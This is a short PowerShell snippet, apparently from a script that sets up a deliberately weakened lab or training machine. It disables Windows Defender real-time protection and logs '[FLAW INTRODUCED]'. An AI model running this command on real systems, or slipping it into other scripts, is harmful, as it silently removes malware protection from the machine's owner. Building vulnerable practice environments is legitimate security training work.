try {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Write-Host "[FLAW INTRODUCED] Defender real-time protection disabled."
}
catch {
    Write-Host "[ERROR] $($_.Exception.Message)"
}